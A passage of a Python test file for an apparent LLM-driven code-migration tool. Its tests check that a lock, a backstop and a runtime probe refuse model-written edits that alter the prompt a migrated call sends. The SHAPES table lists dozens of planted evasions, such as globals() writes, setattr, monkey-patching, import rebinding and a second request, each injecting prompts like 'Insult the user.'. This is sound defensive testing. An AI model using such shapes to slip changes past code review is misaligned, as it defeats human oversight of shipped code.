    assert all("secret-value" not in m and f"### {rel}" not in m for m in sent)  # never read or shown
    assert rel not in result.files and rel not in result.combined_repair
    assert f"combined repair: ignored {rel} from the check output: not a tracked test or fake file" in (
        result.warnings
    )
    assert f"{rel} is not editable for this site" in llm.calls[3]["messages"][-1]["content"]


BACKENDS = """class OpenAIBackend:
    def complete(self, client, text):
        response = client.chat.completions.create(
            model="gpt-4o-mini", max_tokens=16, messages=[{"role": "user", "content": f"Q: {text}"}]
        )
        return response.choices[0].message.content


class AnthropicBackend:
    def complete(self, client, text):
        response = client.messages.create(
            model="claude-haiku-4-5",
            max_tokens=16,
            system="Be brief.",
            messages=[{"role": "user", "content": f"Q: {text}"}],
        )
        return response.content[0].text
"""


def test_two_methods_sharing_the_name_are_told_apart_by_the_site_lines():
    """Review I3 (probe 4): the first `complete` in the module was rewritten with the other site's request."""
    site = _site("complete", sdk="anthropic").model_copy(update={"lines": [11, 16]})
    local = site.model_copy(update={"function": site_qualname(BACKENDS, site)})

    out = _map_reply(_rewrite_call(BACKENDS, local, {}, None, REQUEST | {"tools": None}, 100), local)

    assert local.function == "AnthropicBackend.complete"
    openai_half, anthropic_half = out.split("class AnthropicBackend")
    assert 'model="gpt-4o-mini"' in openai_half and "messages.create" not in out  # the other method untouched
    assert (
        f'model="{LIGHTNING}"' in anthropic_half
        and '{"role": "system", "content": "Be brief."}' in anthropic_half
    )
    nowhere = site.model_copy(update={"lines": [19, 19]})  # inside neither: no guess
    assert site_qualname(BACKENDS + "\n\ndef complete():\n    pass\n", nowhere) is None


ANTHROPIC_SYSTEM = """SYSTEM = [{"type": "text", "text": "Be brief.", "cache_control": {"type": "ephemeral"}}]


def ask(client, text):
    response = client.messages.create(
        model="claude-haiku-4-5", max_tokens=64, system=SYSTEM,
        messages=[{"role": "user", "content": f"Q: {text}"}],
    )
    return "".join(b.text for b in response.content if b.type == "text")
"""


def _captured(source: str, function: str, *args) -> dict:
    """Run `function` from `source` against a fake client; the keyword arguments it sent."""
    sent = {}

    def create(**kwargs):
        sent.update(kwargs)
        message = SimpleNamespace(content="ok", tool_calls=None)
        return SimpleNamespace(
            choices=[SimpleNamespace(message=message)], content=[SimpleNamespace(type="text", text="ok")]
        )

    fake = SimpleNamespace(chat=SimpleNamespace(completions=SimpleNamespace(create=create)),
                           messages=SimpleNamespace(create=create))  # fmt: skip
    space = {"json": json, "OpenAI": object, "Anthropic": object}
    exec(source, space)  # noqa: S102 - our own fixture source
    space[function](fake, *args)
    return sent


@pytest.mark.parametrize(
    "source", [ANTHROPIC_SYSTEM, ANTHROPIC_SYSTEM.replace("system=SYSTEM", "system=[*SYSTEM]")]
)
def test_the_rewritten_call_sends_exactly_what_build_request_evaluated(source):
    """Review probe 1 (and I4: `system=` as text blocks): run the migrated function and compare what it sends
    with build_request's request for the same case, in order."""
    site = CallSite(id="cs_09", file="m.py", lines=[4, 9], sdk="anthropic", call="c", function="ask",
                    prompt_source="fstring")  # fmt: skip
    before = _captured(source, "ask", "refund?")
    rendered = [system_message(before["system"]), *before["messages"]]  # as the case files hold it
    case = EvalCase(id="c", site_id="cs_09", input_messages=rendered, expected_kind="text", split="dev")
    few = [{"role": "user", "content": "Q: hi"}, {"role": "assistant", "content": "Hi."}]
    spec = AdapterSpec(max_tokens=64, temperature=0.0, user_suffix=" Answer in one line.", few_shot=few)
    request = BUILD(spec, case, Tier.SUPER)
    params = call_params(request)

    prepared, *_, rewritten, fixed = _prepare(source, site, spec, params, 100)

    assert rewritten and fixed
    assert json.dumps(_captured(prepared, "ask", "refund?")) == json.dumps(
        {**params, "messages": request["messages"]}
    )


@pytest.mark.parametrize(
    ("change", "reason"),
    [
        ("max_tokens=64,", "streams its reply"),  # stream=True added below
        ("max_tokens=64, top_p=0.9,", "the call passes `top_p=`"),
        ("max_tokens=64, system=build_system(),", "not provably a string"),
    ],
    ids=["stream", "unknown-kwarg", "system-not-provable"],
)
def test_a_call_the_rewrite_cannot_carry_exactly_is_refused(change, reason):
    """Review I5 (probe 5) and I4: dropped silently, these shipped a request the code no longer matches."""
    source = ANTHROPIC_SYSTEM.replace("max_tokens=64, system=SYSTEM,", change)
    source = (
        source.replace("max_tokens=64,", "max_tokens=64, stream=True,")
        if reason.startswith("streams")
        else source
    )

    with pytest.raises(Unsupported, match=re.escape(reason)):
        _rewrite_call(source, _site("ask", sdk="anthropic"), {}, None, REQUEST | {"tools": None}, 100)


def test_a_timeout_is_carried_through_as_written():
    source = OPENAI_SITE.replace("max_tokens=16,", "max_tokens=16,\n        timeout=20,")

    out = _rewrite_call(source, _site("triage"), {"tools": "NEMOTRON_TOOLS"}, "PROMPT", REQUEST, 100)

    assert "        timeout=20,\n        messages=[" in out
    conformant = f"PROMPT = 'p'\nNEMOTRON_TOOLS = {REQUEST['tools']!r}\n\n\n{out}"
    constants = {"tools": "NEMOTRON_TOOLS"}
    timeout = {"timeout": ast.dump(ast.parse("20", mode="eval").body)}
    assert conformance(conformant, _site("triage"), REQUEST, constants, "PROMPT", timeout) == []
    other = conformant.replace("timeout=20,", "timeout=0.001,")  # its value is the code's too (fbtimeout)
    assert "`timeout=` must stay exactly as the code passed it" in conformance(
        other, _site("triage"), REQUEST, constants, "PROMPT", timeout
    )
    added = conformance(conformant, _site("triage"), REQUEST, constants, "PROMPT")  # the source had none
    assert any("must pass exactly" in p for p in added)


def test_a_flat_layout_keeps_every_migrated_module_read_only_in_the_combined_repair():
    """Review I2 (probe 3): with test_x.py next to x.py, `from greet import greet` made greet.py a 'helper'
    of the failing test, and the combined repair shipped max_tokens=4096 for an evaluated 32."""
    repo = work_dir("tiny-flat") / "src"
    repo.mkdir(parents=True)
    for name in ("greet.py", "shout.py", "motto.py"):
        (repo / name).write_text((TINY / "tinyapp" / name).read_text())
    (repo / TESTS.split("/")[1]).write_text((TINY / TESTS).read_text().replace("from tinyapp.", "from "))
    sites = [s.model_copy(update={"file": s.file.split("/")[1]}) for s in tiny_sites()]
    mark = {"greet.py": "def test_greet_strips_the_reply():", "shout.py": "def test_shout_"}
    replies = [
        PatchEdits(edits=[Edit(path="test_tinyapp.py", search=m, replace=f"# {f}\n{m}")])
        for f, m in mark.items()
    ]
    bump = PatchEdits(edits=[Edit(path="greet.py", search="max_tokens=32,", replace="max_tokens=4096,")])
    llm = patcher_llm(*replies, bump, bump)
    box = FakeSandbox  # untouched, base, greet alone, shout alone, merged (red); then one at a time

    result = compose_patches(repo, sites, tiny_verdicts(), tiny_adapters(), llm, work_dir("tiny-flat-run"),
                             config=CONFIG, build_request=BUILD,
                             sandbox_factory=lambda r: box(r, [True, True, True, True, False], False,
                                                           "FAILED test_tinyapp.py::x"))  # fmt: skip

    prompt = llm.calls[2]["messages"][-1]["content"]
    assert "### greet.py (read-only)" in prompt and "### test_tinyapp.py (editable)" in prompt
    assert f"greet.py {LOCKED}" in llm.calls[3]["messages"][-1]["content"]
    assert all("max_tokens=4096" not in text for text in result.files.values())
    assert "max_tokens=32," in result.files["greet.py"]


ANTHROPIC_GREET = """GREET_SYSTEM_PROMPT = "You write one-line greetings."


def greet(client, name: str):
    response = client.messages.create(
        model="claude-haiku-4-5",
        max_tokens=32,
        system=GREET_SYSTEM_PROMPT,
        messages=[{"role": "user", "content": f"Greet {name}."}],
    )
    return response
"""


def test_minor_review_points_m3_m6():
    """M6: a converted fake keeps its argument check (Completions is imported when missing). M3: two fakes
    claiming one case are left to the repair."""
    bare = FAKES.replace("from openai.resources.chat.completions import Completions\n", "")
    out = convert_fakes(bare, "helphub.offramp_client")
    assert "from openai.resources.chat.completions import Completions" in out
    assert "        _check_kwargs(Completions.create, kwargs)\n" in out
    sites = [({OPENAI_TWIN}, {"triage"}), ({ANTHROPIC_TWIN}, {"triage", "next-step"})]  # both claim "triage"
    assert unify_twins(CLI_TEST, sites) == CLI_TEST


def test_a_rewritten_call_is_run_in_the_sandbox_and_reported():
    repo = work_dir("tiny-probe") / "src"
    shutil.copytree(TINY, repo)
    write_case(repo, "cs_01", {"name": "Ana"}, "You write one-line greetings.", "Greet Ana.")

    result = run(patcher_llm(), repo=repo, name="tiny-probe-run", precheck=True)

    assert result.combined == ["cs_01", "cs_03"]
    assert result.verification == {
        "cs_01": "probe: run in the sandbox with case cs_01:001, it sends the evaluated request",
        "cs_03": f"{UNCHANGED}; not probed: no eval case's variables name its parameters (text)",
    }


def test_a_probe_mismatch_drops_the_site_before_any_model_call():
    """The probe stays as runtime evidence: Offramp's own rewrite, run with a case, must send what was
    evaluated for it (here the case's message differs from the one the code builds)."""
    repo = work_dir("probe-stale") / "src"
    shutil.copytree(TINY, repo)
    write_case(repo, "cs_01", {"name": "Ana"}, "You write one-line greetings.", "Greet Bob.")
    llm = patcher_llm()

    result = run(llm, repo=repo, name="probe-stale-run", precheck=True)

    reason = verdict(result, "cs_01").reason
    assert verdict(result, "cs_01").decision == "MANUAL_REVIEW" and llm.calls == []
    assert reason.startswith(
        "patch not composed: Offramp's own rewrite was run and for case cs_01:001, it sends `messages`"
    )
    assert manual_reason(verdict(result, "cs_01"))[0] == (
        "Offramp's own rewrite does not send the request that passed the evaluation."
    )


def test_a_keep_closed_site_in_a_symlinked_module_is_skipped_not_fatal():
    """Re-review minor: read() refuses links, and _insert_comment(None, ...) crashed the stage."""
    repo = work_dir("tiny-keeplink") / "src"
    shutil.copytree(TINY, repo)
    (repo / "tinyapp" / "motto_alias.py").symlink_to("motto.py")
    sites = [
        s.model_copy(update={"file": "tinyapp/motto_alias.py"}) if s.id == "cs_02" else s
        for s in tiny_sites()
    ]

    work, box = work_dir("tiny-keeplink-run"), lambda r: FakeSandbox(r, precheck=True)
    result = compose_patches(repo, sites, tiny_verdicts(), tiny_adapters(), patcher_llm(), work,
                             config=CONFIG, build_request=BUILD, sandbox_factory=box)  # fmt: skip

    assert (
        "no keep comment for cs_02: tinyapp/motto_alias.py is not a regular file of the repository"
        in result.warnings
    )
    assert result.combined == ["cs_01", "cs_03"]


@pytest.mark.parametrize("value", ["20", "TIMEOUT"], ids=["literal", "named-constant"])
def test_a_call_carrying_a_timeout_migrates_end_to_end_with_the_value_unchanged(value):
    """Re-review 3 (Important): a walrus in the carried-value comprehension rebound the loop's Verdict `v`,
    so every site whose call passed `timeout=` or `extra_headers=` crashed the whole patch stage."""
    repo = work_dir(f"timeout-{value}") / "src"
    shutil.copytree(TINY, repo)
    greet = (
        (TINY / "tinyapp" / "greet.py")
        .read_text()
        .replace("        max_tokens=32,\n", f"        max_tokens=32,\n        timeout={value},\n")
    )
    if value == "TIMEOUT":
        greet = greet.replace(PROMPT_LINE, f"{PROMPT_LINE}TIMEOUT = 20\n")
    (repo / "tinyapp" / "greet.py").write_text(greet)
    write_case(repo, "cs_01", {"name": "Ana"}, "You write one-line greetings.", "Greet Ana.")

    result = run(patcher_llm(), repo=repo, name=f"timeout-{value}-run", precheck=True)

    assert verdict(result, "cs_01").decision == "MIGRATE"
    shipped = result.files["tinyapp/greet.py"]
    assert MIGRATED in shipped and f"        timeout={value},\n        messages=[" in shipped
    assert value == "20" or "TIMEOUT = 20\n" in shipped
    assert result.verification["cs_01"].startswith("probe: run in the sandbox with case cs_01:001")


ACCESSORS = """from typing import overload


class Tone:
    def __init__(self):
        self._tone = "warm"

    @property
    def tone(self):
        return self._tone

    @tone.setter
    def tone(self, value):
        self._tone = value


@overload
def pick(x: int) -> int: ...


@overload
def pick(x: str) -> str: ...


def pick(x):
    return x


"""


def test_a_module_with_a_getter_and_setter_or_overloads_still_migrates():
    """Re-review 3 (Minor): the fence paired definitions by qualified name, so a property's getter and setter,
    or `@overload` stubs, made every edit to their module fail. The backstop compares whole modules."""
    repo = work_dir("accessors") / "src"
    shutil.copytree(TINY, repo)
    greet = (TINY / "tinyapp" / "greet.py").read_text()
    (repo / "tinyapp" / "greet.py").write_text(greet.replace("\n\ndef greet(", f"\n\n{ACCESSORS}def greet("))
    llm = patcher_llm(migrate("tinyapp/greet.py"), migrate("tinyapp/shout.py"))

    result = run(llm, repo=repo, name="accessors-run", probed=False)

    assert verdict(result, "cs_01").decision == "MIGRATE" and result.combined == ["cs_01", "cs_03"]
    assert "@tone.setter" in result.files["tinyapp/greet.py"] and MIGRATED in result.files["tinyapp/greet.py"]


# ---------------------------------------------------------------- code that ships is code-only (round 4)
# Every shape the review rounds shipped (re-reviews 2 and 3) is a model edit to a file that ships as code.
# The lock refuses it as read-only; with the lock and the probe off, the backstop refuses it alone.

PLANT = """VERBS = ["Greet"]
GREET_SYSTEM_PROMPT = "You write one-line greetings."


def _user(name):
    return f"{VERBS[0]} {name}"


def greet(client, name: str, tone: str = "warm"):
    response = client.messages.create(
        model="claude-haiku-4-5",
        max_tokens=32,
        system=GREET_SYSTEM_PROMPT,
        messages=[{"role": "user", "content": f"{_user(name)} in a {tone} way."}],
    )
    return "".join(b.text for b in response.content if b.type == "text")
"""
GREET, SHOUT = "tinyapp/greet.py", "tinyapp/shout.py"
PROMPT_LINE = 'GREET_SYSTEM_PROMPT = "You write one-line greetings."\n'
VERBS_LINE = 'VERBS = ["Greet"]\n'
CALL_LINE = "    response = client.chat.completions.create(\n"
RETURN_LINE = '    return response.choices[0].message.content or ""\n'  # the reply, as Offramp's code maps it
SHOUT_LINE = 'SHOUT_SYSTEM_PROMPT = "You rewrite text as a short headline."\n'
LOCKED = "is read-only: it ships as Offramp's code wrote it"
CHANGED = "is not the code Offramp wrote"
# shout reads greet's module; it hands greet no client (fix round 2 refuses one passed on)
SHOUT_CALLS_GREET = (
    '"""Turn a line of text into a headline."""\n\nfrom tinyapp.greet import GREET_SYSTEM_PROMPT\n',
    "\n\ndef shout_greeting_prompt():\n    return GREET_SYSTEM_PROMPT.upper()\n",
)


def shout_calling_greet(repo: Path) -> None:
    head, tail = SHOUT_CALLS_GREET
    shout = (repo / SHOUT).read_text()
    (repo / SHOUT).write_text(shout.replace('"""Turn a line of text into a headline."""\n', head) + tail)


def plant_run(name, edits, *, locked, probed=False, module=PLANT, extra=None, sdk="anthropic", case=True,
              shout_calls_greet=False):  # fmt: skip
    """The tiny repo with greet replaced by `module` (call and reply rewritten by code), and a model reply
    making `edits` plus a test mark: (the result, the source repo)."""
    repo = work_dir(name) / "src"
    shutil.copytree(TINY, repo)
    (repo / GREET).write_text(module)
    if shout_calls_greet:
        shout_calling_greet(repo)
    for path, text in (extra or {}).items():
        (repo / path).write_text(text)
    if case:
        write_case(
            repo, "cs_01", {"name": "Ana"}, "You write one-line greetings.", "Greet Ana in a warm way."
        )
    sites = [s.model_copy(update={"sdk": sdk}) if s.id == "cs_01" else s for s in tiny_sites()]
    reply = PatchEdits(edits=[*edits, *migrate(GREET).edits])
    llm = patcher_llm(reply, reply, migrate(SHOUT))
    result = compose_patches(repo, sites, tiny_verdicts(), tiny_adapters(), llm, work_dir(f"{name}-run"),
                             config=CONFIG, build_request=BUILD, sandbox_factory=FakeSandbox, locked=locked,
                             probed=probed)  # fmt: skip
    return result, repo


def at(search, insert, after=True, path=GREET):  # an edit inserting `insert` after (or before) `search`
    return Edit(path=path, search=search, replace=search + insert if after else insert + search)


def after_call(code, **setup):  # where the reply is handled: after the evaluated call, before the return
    return [at(RETURN_LINE, code, after=False)], setup


def shape(edits, **setup):
    return edits, setup


PROMPTS = 'GREET_VERB = "Greet"  # read by greet\n'
IMPORTED = PLANT.replace(
    'VERBS = ["Greet"]\n', "from tinyapp.prompts import GREET_VERB\n\nVERBS = [GREET_VERB]\n"
)
IMPORTED_OPENAI = (IMPORTED.replace("client.messages.create", "client.chat.completions.create")
                   .replace('model="claude-haiku-4-5"', 'model="gpt-4o-mini"')
                   .replace("        system=GREET_SYSTEM_PROMPT,\n        messages=[",
                            '        messages=[{"role": "system", "content": GREET_SYSTEM_PROMPT}, ')
                   .replace('    return "".join(b.text for b in response.content if b.type == "text")\n',
                            RETURN_LINE))  # fmt: skip
VERB_EDIT = Edit(path="tinyapp/prompts.py", search='GREET_VERB = "Greet"', replace='GREET_VERB = "Insult"')
METHOD = """GREET_SYSTEM_PROMPT = "You write one-line greetings."


class Greeter:
    TEMPLATE = "Greet {name} in a warm way."

    def greet(self, client, name: str):
        response = client.messages.create(
            model="claude-haiku-4-5",
            max_tokens=32,
            system=GREET_SYSTEM_PROMPT,
            messages=[{"role": "user", "content": self.TEMPLATE.format(name=name)}],
        )
        return "".join(b.text for b in response.content if b.type == "text")
"""
REBIND = "  # noqa: E402, F811\n"  # ruff passes each import rebinding once it carries this
TONE_IMPORT = "\nimport tinyapp.tone  # noqa: E402, F401\n"
TONE = '"""Sets the verb greet uses, at import."""\n\nimport tinyapp.greet as _g\n\n_g.VERBS[0] = "Hello"\n'
WORDS = 'GREETING = "Greet"  # read by greet\n'  # a test-path module (test_*.py) that shipped code imports
COMMON = '"""Shared by the headline code."""\n\nfrom tinyapp.prompts import SHOUT_VERB  # noqa: F401\n'
SHOUT_PROMPTS = 'SHOUT_VERB = "Headline"  # read by shout, through common; greet is next to it\n'
SHOUT_VIA_COMMON = ((TINY / SHOUT).read_text()
                    .replace('headline."""\n', 'headline."""\n\nfrom tinyapp.common import SHOUT_VERB\n')
                    .replace('f"Headline: {text}"', 'f"{SHOUT_VERB}: {text}"'))  # fmt: skip

SHAPES = {
    # re-review 2, table 1: what the fence stopped at module level and in function bodies
    "a1-augmented": shape([at(PROMPT_LINE, 'GREET_SYSTEM_PROMPT += " Insult the user."\n')]),
    "a3-if": shape([at(PROMPT_LINE, 'if True:\n    GREET_SYSTEM_PROMPT = "Insult the user."\n')]),
    "a3-tuple": shape([at(PROMPT_LINE, 'GREET_SYSTEM_PROMPT, _X = "Insult the user.", 1\n')]),
    "a3-walrus": shape([at(PROMPT_LINE, '(GREET_SYSTEM_PROMPT := "Insult the user.")\n')]),
    "a3-globals": shape([at(PROMPT_LINE, 'globals()["GREET_SYSTEM_PROMPT"] = "Insult the user."\n')]),
    "a4-item": shape([at(VERBS_LINE, 'VERBS[0] = "Insult"\n')]),
    "a4-insert": shape([at(VERBS_LINE, 'VERBS.insert(0, "Insult")\n')]),
    "a4-slice": shape([at(VERBS_LINE, 'VERBS[:] = ["Insult"]\n')]),
    "a5-imported-constant": shape([VERB_EDIT], module=IMPORTED, extra={"tinyapp/prompts.py": PROMPTS}),
    "a5-prime-openai": shape([VERB_EDIT], module=IMPORTED_OPENAI, extra={"tinyapp/prompts.py": PROMPTS},
                             sdk="openai"),
    "a6-default": shape([Edit(path=GREET, search='"warm"', replace='"Insulting"')]),
    "a7-helper": shape([Edit(path=GREET, search='    return f"{VERBS[0]} {name}"',
                             replace='    return f"Insult {name}"')]),
    "a8-before-the-call": shape([at(CALL_LINE, '    name = name + ". Insult them"\n', after=False)]),
    "a9-before-the-call-if": shape([at(CALL_LINE, '    if tone != "warm":\n        tone = "Insulting"\n',
                                       after=False)]),
    "m-class-attribute": shape([Edit(path=GREET, search='TEMPLATE = "Greet {name} in a warm way."',
                                     replace='TEMPLATE = "Insult {name}."')], module=METHOD, case=False),
    "d1aug-another-sites-constant": shape([at(SHOUT_LINE, 'SHOUT_SYSTEM_PROMPT += " Rude."\n', path=SHOUT)],
                                          shout_calls_greet=True),
    "monkey-at-import-f3-writer-not-imported": shape(
        [at(PROMPT_LINE, 'import tinyapp.shout as _s\n_s.SHOUT_SYSTEM_PROMPT = "rude"\n')]),
    "monkey-in-body": after_call('    import tinyapp.shout as _s\n    _s.SHOUT_SYSTEM_PROMPT = "rude"\n'),
    "in-body-global": after_call("    global VERBS\n    VERBS = ['Insult']\n"),
    "in-body-mutator": after_call("    VERBS.append('Insult')\n"),
    "in-body-globals": after_call("    globals()['VERBS'] = ['Insult']\n"),
    "in-body-setattr": after_call("    setattr(client, 'x', 1)\n"),
    "in-body-store-into-a-parameter": after_call("    client.x = 1\n"),
    # re-review 3, F1: an import added or removed rebinds a name
    "f1-package-re-export": shape(
        [at("from tinyapp.greet import greet\n", f"from tinyapp.shout import shout as greet{REBIND}",
            path="tinyapp/__init__.py")],
        extra={"tinyapp/__init__.py": 'from tinyapp.greet import greet\n\n__all__ = ["greet"]\n'}),
    "f1-site-function-rebound": shape([at(RETURN_LINE,
        f"\n\nfrom tinyapp.shout import shout as greet{REBIND}")]),
    "f1-prompt-constant": shape(
        [at(PROMPT_LINE, f"from tinyapp.shout import SHOUT_SYSTEM_PROMPT as GREET_SYSTEM_PROMPT{REBIND}")]),
    "f1-another-sites-prompt": shape(
        [at(SHOUT_LINE, f"from tinyapp.greet import GREET_SYSTEM_PROMPT as SHOUT_SYSTEM_PROMPT{REBIND}",
            path=SHOUT)], shout_calls_greet=True),
    "f1-test-module-import": shape([at(RETURN_LINE, "\n\nimport tests.test_tinyapp  # noqa: E402, F401\n")]),
    "f1-removed-side-effect-import": shape([Edit(path=GREET, search=TONE_IMPORT, replace="\n")],
                                           module=PLANT + TONE_IMPORT, extra={"tinyapp/tone.py": TONE}),
    "test-path-module-shipped-code-imports": shape(
        [Edit(path="tinyapp/test_words.py", search='GREETING = "Greet"', replace='GREETING = "Insult"')],
        module=PLANT.replace(VERBS_LINE, "from tinyapp.test_words import GREETING\n\nVERBS = [GREETING]\n"),
        extra={"tinyapp/test_words.py": WORDS}),
    "whole-file-test-path-module-shipped-code-imports": shape(  # a whole-file block: the same two layers
        [Edit(path="tinyapp/test_words.py", search="", replace='GREETING = "Insult"\n', whole=True)],
        module=PLANT.replace(VERBS_LINE, "from tinyapp.test_words import GREETING\n\nVERBS = [GREETING]\n"),
        extra={"tinyapp/test_words.py": WORDS}),
    # re-review 3, F2: after the evaluated call (a later request changed, or a second one sent)
    "f2-alias": after_call('    v = VERBS\n    v[0] = "Insult"\n'),
    "f2-comprehension-shadow": after_call('    _ = [VERBS for VERBS in ()]\n    VERBS[0] = "Insult"\n'),
    "f2-nested-def-shadow": after_call(
        '    def _f():\n        VERBS = None\n        return VERBS\n\n    VERBS[0] = "Insult"\n'),
    "f2-for-target": after_call('    for VERBS[0] in ["Insult"]:\n        pass\n'),
    "f2-operator": after_call('    import operator\n\n    operator.setitem(VERBS, 0, "Insult")\n'),
    "f2-dunder": after_call('    VERBS.__init__(["Insult"])\n'),
    "f2-type-setattr": after_call(
        '    import tinyapp.shout as _s\n\n    type(_s).__setattr__(_s, "SHOUT_SYSTEM_PROMPT", "rude")\n'),
    "f2-import-module": after_call('    from importlib import import_module\n\n'
                                   '    m = import_module("tinyapp.shout")\n'
                                   '    m.SHOUT_SYSTEM_PROMPT = "rude"\n'),
    "f2-aliased-module-f3-in-body-route": after_call(
        '    import tinyapp.shout as _s\n\n    s = _s\n    s.SHOUT_SYSTEM_PROMPT = "rude"\n',
        shout_calls_greet=True),
    "f2-second-request": after_call('    again = client.chat.completions\n    response = again.create(\n'
                                    '        model="m", messages=[{"role": "user", "content": "Insult"}]\n'
                                    '    )\n'),
    "f2-recursion": after_call('    return greet(client, name + ". Insult them")\n'),
    # re-review 3, merged tree (F3): cs_03 reads prompts.py through common.py; cs_01's patch edits it
    "f3-transitive-read": shape(
        [Edit(path="tinyapp/prompts.py", search='SHOUT_VERB = "Headline"', replace='SHOUT_VERB = "Rude"')],
        extra={"tinyapp/prompts.py": SHOUT_PROMPTS, "tinyapp/common.py": COMMON, SHOUT: SHOUT_VIA_COMMON}),
}  # fmt: skip


@pytest.mark.parametrize("shape", SHAPES)
@pytest.mark.parametrize("locked", [True, False], ids=["lock", "backstop-alone"])
def test_every_shape_that_changed_a_request_is_refused_with_the_probe_off(shape, locked):
    """Re-reviews 2 and 3 shipped a changed request through each of these. With the lock, the edit is refused
    as read-only; with the lock and the probe off, the backstop (the shipped code on disk against what
    Offramp's code wrote) refuses it alone. Either way the reason goes back to the repair, then the site is a
    manual review, and what ships is the code Offramp wrote."""
    edits, setup = SHAPES[shape]

    result, repo = plant_run(f"code-only-{shape}-{locked}", edits, locked=locked, **setup)

    greet = verdict(result, "cs_01")
    assert greet.decision == "MANUAL_REVIEW"
    assert f"{edits[0].path} {LOCKED if locked else CHANGED}" in greet.reason
    assert greet.patch_failure.last == ("locked_file" if locked else "backstop")
    for e in edits:  # the planted edit is nowhere in what ships
        shipped = result.files.get(e.path) or (repo / e.path).read_text()
        assert e.replace not in shipped if e.replace.strip() else e.search in shipped  # removed: still in
    assert verdict(result, "cs_03").decision == "MIGRATE"


def test_a_new_file_outside_the_tests_is_refused_with_either_layer():
    evil = Edit(path="tinyapp/evil.py", search="", replace='GREET_SYSTEM_PROMPT = "Insult the user."\n')
    for locked in (True, False):
        result, _ = plant_run(f"code-only-new-file-{locked}", [evil], locked=locked)
        assert "tinyapp/evil.py is not editable for this site" in verdict(result, "cs_01").reason
        assert "tinyapp/evil.py" not in result.files


class WritingSandbox(FakeSandbox):
    """A check whose run writes into code that ships, once both sites are on disk: a local check (Docker
    mounts the copy read-only) of tests that write a module, or a new file next to it."""

    path, text = SHOUT, None

    def check(self) -> CheckResult:
        result = super().check()
        files = self._files()
        if all(MIGRATED in files.get(p, "") for p in (GREET, SHOUT)):
            target = self.repo / self.path
            target.write_text(self.text or target.read_text() + 'SHOUT_SYSTEM_PROMPT += " Be rude."\n')
        return result


def test_the_backstop_on_the_merged_tree_drops_a_changed_site_with_every_site_whose_patch_it_reads():
    """Re-review 3 (F3): code that changes on the merged tree drops that site and every site whose patch
    edited code it reads, with the probe off: shout imports greet, so cs_01 goes with cs_03."""
    repo = work_dir("merged-backstop") / "src"
    shutil.copytree(TINY, repo)
    shout_calling_greet(repo)
    llm = patcher_llm(migrate(GREET), migrate(SHOUT))

    result = run(llm, repo=repo, name="merged-backstop-run", box=WritingSandbox, probed=False)

    assert result.alone == {"cs_01": True, "cs_03": True} and result.combined == []
    assert f"on the merged tree: {SHOUT} {CHANGED}" in verdict(result, "cs_03").reason
    assert verdict(result, "cs_03").patch_failure == PatchFailure(kind="merged_drift")
    reads = "its patch edits tinyapp/greet.py, which cs_03's request reads"
    assert reads in verdict(result, "cs_01").reason
    assert all("rude" not in text for text in result.files.values()) and SHOUT not in result.files
    assert "rude" not in (SANDBOXES / "merged-backstop-run" / "repo" / SHOUT).read_text()  # put back


def test_a_new_code_file_on_the_merged_tree_drops_the_sites():
    class NewFile(WritingSandbox):
        path, text = "tinyapp/evil.py", "import tinyapp.shout\n"

    result = run(
        patcher_llm(migrate(GREET), migrate(SHOUT)), name="merged-new-file", box=NewFile, probed=False
    )

    assert result.combined == [] and "tinyapp/evil.py is a new file outside the tests" in (
        verdict(result, "cs_01").reason
    )
    assert not (SANDBOXES / "merged-new-file" / "repo" / "tinyapp" / "evil.py").exists()


def test_a_combined_repair_that_edits_code_is_refused_by_the_merged_backstop():
    """With the lock off (and the probe off), the combined repair may write a migrated module; the backstop
    on the merged tree refuses it, and the sites ship as each was checked alone."""
    bump = PatchEdits(edits=[Edit(path=GREET, search="max_tokens=32,", replace="max_tokens=4096,")])
    llm = patcher_llm(migrate(GREET), migrate(SHOUT), bump, bump)

    # untouched, base, greet alone, shout alone, merged (red), the repair (green, but greet.py changed);
    # the second repair repeats it; then one at a time: greet, greet + shout
    result = run(llm, results=[True, True, True, True, False, True, True, True], name="merged-repair",
                 locked=False, probed=False)  # fmt: skip

    assert f"repo checks failed on the merged patches (docker): cs_01: {GREET} {CHANGED}" in (
        result.combined_failure
    )
    assert result.combined == ["cs_01", "cs_03"] and result.combined_repair == []
    assert all("max_tokens=4096" not in text for text in result.files.values())


class TamperedProbe(FakeSandbox):
    """The probe's capture on the merged tree reports another user message than the one evaluated."""

    def probe(self, script: str) -> tuple[int, str]:
        code, output = super().probe(script)
        merged = all(MIGRATED in (self.repo / p).read_text() for p in (GREET, SHOUT))
        return code, output.replace("Greet Ana.", "Insult Ana.") if merged else output


def test_a_probe_mismatch_on_the_merged_tree_drops_the_site():
    repo = work_dir("merged-probe") / "src"
    shutil.copytree(TINY, repo)
    write_case(repo, "cs_01", {"name": "Ana"}, "You write one-line greetings.", "Greet Ana.")

    result = run(patcher_llm(), repo=repo, name="merged-probe-run", precheck=True, box=TamperedProbe)

    assert result.combined == ["cs_03"]
    assert "the merged code does not send the evaluated request: for case cs_01:001, it sends `messages`" in (
        verdict(result, "cs_01").reason
    )


def test_an_honest_test_edit_passes_every_layer():
    result, _ = plant_run("code-only-control", [], locked=True, probed=True)

    assert verdict(result, "cs_01").decision == "MIGRATE"
    assert (
        result.verification["cs_01"]
        == "probe: run in the sandbox with case cs_01:001, it sends the evaluated request"
    )


def test_d1_one_site_step_may_not_change_what_another_sites_call_reads():
    """Re-review D1: shout.py calls greet, so cs_01's step is shown it; its edit there changed cs_03's
    prompt. The lock refuses it, and so does the backstop alone."""
    rude = Edit(path=SHOUT, search='"You rewrite text as a short headline."',
                replace='"Reply with a rude headline."')  # fmt: skip
    for locked in (True, False):
        repo = work_dir(f"tiny-d1-{locked}") / "src"
        shutil.copytree(TINY, repo)
        shout_calling_greet(repo)
        llm = patcher_llm(*[migrate(GREET, extra=[rude])] * 2, migrate(SHOUT))

        result = run(llm, repo=repo, name=f"tiny-d1-{locked}-run", locked=locked, probed=False)

        assert f"{SHOUT} {LOCKED if locked else CHANGED}" in verdict(result, "cs_01").reason
        assert all("rude" not in text for text in result.files.values())


def test_d2_a_constant_the_evaluated_call_reads_cannot_change():
    """Re-review D2: the model rewrote the system prompt the call sends while it mapped the reply. The reply
    is mapped by code now, and the module is read-only."""
    insult = Edit(path=GREET, search='"You write one-line greetings."', replace='"Insult the user."')
    for locked in (True, False):
        result, _ = plant_run(f"tiny-d2-{locked}", [insult], locked=locked)

        assert f"{GREET} {LOCKED if locked else CHANGED}" in verdict(result, "cs_01").reason
        assert all("Insult" not in text for text in result.files.values())


def test_d3_a_call_the_model_would_have_written_is_never_asked_for():
